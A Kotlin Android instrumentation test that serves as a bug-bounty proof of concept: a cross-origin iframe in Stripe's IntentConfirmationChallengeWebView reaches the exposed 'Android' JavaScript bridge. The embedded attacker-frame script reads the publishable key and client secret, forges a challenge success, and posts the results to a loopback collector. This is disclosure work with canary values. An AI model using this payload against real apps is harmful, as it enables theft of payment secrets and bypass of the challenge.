package com.stripe.android.challenge.confirmation

import android.net.Uri
import androidx.test.core.app.ActivityScenario
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import com.google.common.truth.Truth.assertThat
import com.stripe.android.TestActivity
import com.stripe.android.core.ApiConfiguration
import com.stripe.android.core.Logger
import com.stripe.android.testing.PaymentIntentFactory
import com.stripe.android.testing.FakeErrorReporter
import java.io.Closeable
import java.net.InetAddress
import java.net.ServerSocket
import java.util.Collections
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import org.junit.After
import org.junit.Test
import org.junit.runner.RunWith

/**
 * Real-WebView PoC (bug bounty report /reports/4119714):
 * the production `Android` JavaScript interface registered by
 * [IntentConfirmationChallengeWebView] is reachable from JavaScript running
 * in a CROSS-ORIGIN iframe loaded inside the WebView, with no origin
 * validation anywhere in the component, and it hands that frame:
 *   - the live PaymentIntent/SetupIntent client secret + publishable key
 *     via getInitParams()
 *   - the ability to forge a completed-challenge result via onSuccess()
 *
 * Unlike the Robolectric unit PoC (which exercises the same wiring on the
 * JVM), this test runs on a real Android emulator WebView:
 *   - origin A (parent page) is served from 127.0.0.1:<portA>
 *   - origin B (attacker frame) is served from 127.0.0.1:<portB>
 *     (different port => different origin, enforced by the browser)
 *   - the iframe's OWN JavaScript calls Android.getInitParams() and
 *     Android.onSuccess(...) and exfiltrates the result to origin B's
 *     collector endpoint, which the test asserts on.
 *
 * No code in this test calls the bridge methods directly - only the
 * iframe's JavaScript does, on a real WebView.
 *
 * Pinned analysis commit: 363bcfa890de14fcd2cf8358bd414fdb67ace2f3
 */
@RunWith(AndroidJUnit4::class)
internal class IntentConfirmationChallengeRealWebViewPoCTest {

    private val canaryPublishableKey = "pk_test_canary_PUBLISHABLE_KEY"
    private val canaryClientSecret = "pi_canary_SECRET_do_not_use"
    private val forgedClientSecret = "pi_REAL_FORGED_secret_from_iframe"

    private val instrumentation = InstrumentationRegistry.getInstrumentation()

    private lateinit var parentServer: MiniServer
    private lateinit var frameServer: MiniServer
    private val frameCollector = BodyCollector()
    private val mainCollector = BodyCollector()
    private val openedUris = Collections.synchronizedList(mutableListOf<Uri>())

    private fun createHandler(): DefaultConfirmationChallengeBridgeHandler {
        val args = IntentConfirmationChallengeArgs(
            apiConfiguration = ApiConfiguration.State(canaryPublishableKey, "acct_canary"),
            intent = PaymentIntentFactory.create(clientSecret = canaryClientSecret),
            productUsage = listOf("PaymentSheet"),
            captchaVendorName = "hcaptcha",
        )
        return DefaultConfirmationChallengeBridgeHandler(
            successParamsParser = BridgeSuccessParamsJsonParser(),
            errorParamsParser = BridgeErrorParamsJsonParser(),
            args = args,
            errorReporter = FakeErrorReporter(),
        )
    }

    @After
    fun tearDown() {
        runCatching { parentServer.close() }
        runCatching { frameServer.close() }
    }

    @Test
    fun crossOriginIframeJavaScriptReceivesClientSecretAndForgesSuccess() {
        // ---- origin B: attacker frame server ----
        frameServer = MiniServer { method, path, body ->
            when {
                method == "POST" && path == "/collect-frame" -> {
                    frameCollector.add(body.orEmpty())
                    200 to "{}"
                }
                method == "GET" && path == "/frame.html" -> 200 to buildFrameHtml()
                else -> 404 to "not found"
            }
        }

        // ---- origin A: parent page server ----
        parentServer = MiniServer { method, path, body ->
            when {
                method == "POST" && path == "/collect-main" -> {
                    mainCollector.add(body.orEmpty())
                    200 to "{}"
                }
                method == "GET" -> 200 to buildParentHtml(frameServer.port)
                else -> 404 to "not found"
            }
        }

        val parentUrl = "http://127.0.0.1:${parentServer.port}/"
        val handler = createHandler()

        ActivityScenario.launch(TestActivity::class.java).use { scenario ->
            var webView: IntentConfirmationChallengeWebView? = null

            scenario.onActivity { activity ->
                val wv = IntentConfirmationChallengeWebView(activity)
                webView = wv
                wv.addBridgeHandler(handler)
                wv.webViewClient = IntentConfirmationWebViewClient(
                    hostUrl = parentUrl,
                    errorHandler = {},
                    logger = Logger.getInstance(enableLogging = false),
                    openUri = { uri -> openedUris.add(uri) },
                )
                activity.setContentView(wv)
                wv.loadUrl(parentUrl)
            }

            // The iframe's JS exfiltrates to origin B's collector.
            val frameBodies = frameCollector.awaitAll(2, timeoutSeconds = 45)
            assertThat(frameBodies).isNotEmpty()

            val frameReport = JSONObject(frameBodies.first())
            val origin = frameReport.getString("origin")

            // 1. The report came from a genuinely DIFFERENT origin than the parent page.
            assertThat(origin).isEqualTo("http://127.0.0.1:${frameServer.port}")
            assertThat(frameServer.port).isNotEqualTo(parentServer.port)

            // 2. The `Android` bridge is reachable from that cross-origin frame's JS.
            assertThat(frameReport.getBoolean("hasAndroid")).isTrue()

            // 3. The frame received the publishable key + live client secret.
            val initParams = JSONObject(frameReport.getString("initParams"))
            assertThat(initParams.getString("publishableKey")).isEqualTo(canaryPublishableKey)
            assertThat(initParams.getString("clientSecret")).isEqualTo(canaryClientSecret)

            // 4. The same frame forged a completed-challenge result through onSuccess().
            assertThat(frameReport.getBoolean("forgedSuccessSent")).isTrue()
            val successEvent = runBlocking {
                withTimeout(30_000) {
                    handler.event.first { it is ConfirmationChallengeBridgeEvent.Success }
                }
            } as ConfirmationChallengeBridgeEvent.Success
            assertThat(successEvent.clientSecret).isEqualTo(forgedClientSecret)

            // 5. Control: the MAIN frame also has the interface (platform behavior).
            val mainBodies = mainCollector.awaitAll(1, timeoutSeconds = 30)
            if (mainBodies.isNotEmpty()) {
                val mainReport = JSONObject(mainBodies.first())
                assertThat(mainReport.getBoolean("hasAndroid")).isTrue()
            }

            // 6. Production WebViewClient: nothing was kicked out to an external
            //    browser during this flow - the iframe content never even needed
            //    a main-frame navigation to reach the bridge.
            assertThat(openedUris).isEmpty()
        }
    }

    private fun buildParentHtml(framePort: Int): String = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>parent origin A</title></head>
        <body>
        <script>
          fetch('/collect-main', {method: 'POST', body: JSON.stringify({
            frame: 'main',
            origin: location.origin,
            hasAndroid: typeof Android !== 'undefined'
          })});
        </script>
        <iframe src="http://127.0.0.1:$framePort/frame.html" width="320" height="240"></iframe>
        </body></html>
    """.trimIndent()

    private fun buildFrameHtml(): String = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>attacker origin B</title></head>
        <body><script>
        (async function () {
          const out = {
            frame: 'iframe',
            origin: location.origin,
            hasAndroid: typeof Android !== 'undefined'
          };
          try {
            if (out.hasAndroid) {
              out.initParams = Android.getInitParams();
              Android.onSuccess(JSON.stringify({client_secret: "$forgedClientSecret"}));
              out.forgedSuccessSent = true;
            }
          } catch (e) {
            out.error = String(e);
          }
          await fetch('/collect-frame', {method: 'POST', body: JSON.stringify(out)});
        })();
        </script></body></html>
    """.trimIndent()

    // ---- minimal loopback HTTP server (two ports => two origins) ----

    private class BodyCollector {
        private val bodies = Collections.synchronizedList(mutableListOf<String>())
        private val latch = CountDownLatch(1)

        fun add(body: String) {
            bodies.add(body)
            latch.countDown()
        }

        fun awaitAll(minCount: Int, timeoutSeconds: Long): List<String> {
            latch.await(timeoutSeconds, TimeUnit.SECONDS)
            val deadline = System.currentTimeMillis() + 1_000
            while (bodies.size < minCount && System.currentTimeMillis() < deadline) {
                Thread.sleep(50)
            }
            return bodies.toList()
        }
    }

    private class MiniServer(
        private val handler: (method: String, path: String, body: String?) -> Pair<Int, String>,
    ) : Closeable {
        private val socket = ServerSocket(0, 50, InetAddress.getByName("127.0.0.1"))
        val port: Int get() = socket.localPort

        private val thread = Thread {
            while (!socket.isClosed) {
                runCatching {
                    socket.accept().use { client ->
                        val input = client.getInputStream().bufferedReader()
                        val requestLine = input.readLine() ?: return@use
                        val parts = requestLine.split(" ")
                        val method = parts.getOrElse(0) { "GET" }
                        val path = parts.getOrNull(1)?.substringBefore("?") ?: "/"
                        var contentLength = 0
                        while (true) {
                            val line = input.readLine() ?: break
                            if (line.isEmpty()) break
                            if (line.startsWith("Content-Length:", ignoreCase = true)) {
                                contentLength = line.substringAfter(":").trim().toIntOrNull() ?: 0
                            }
                        }
                        val body = if (contentLength > 0) {
                            val bytes = ByteArray(contentLength)
                            var read = 0
                            while (read < contentLength) {
                                val n = client.getInputStream().read(bytes, read, contentLength - read)
                                if (n < 0) break
                                read += n
                            }
                            String(bytes, 0, read, Charsets.UTF_8)
                        } else {
                            null
                        }
                        val (code, payload) = handler(method, path, body)
                        val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                        val status = if (code == 200) "OK" else "Not Found"
                        val header = (
                            "HTTP/1.1 $code $status\r\n" +
                                "Content-Type: text/html; charset=utf-8\r\n" +
                                "Content-Length: ${payloadBytes.size}\r\n" +
                                "Connection: close\r\n\r\n"
                            ).toByteArray(Charsets.UTF_8)
                        client.getOutputStream().write(header)
                        client.getOutputStream().write(payloadBytes)
                        client.getOutputStream().flush()
                    }
                }
            }
        }.apply {
            isDaemon = true
            start()
        }

        override fun close() {
            runCatching { socket.close() }
        }
    }
}
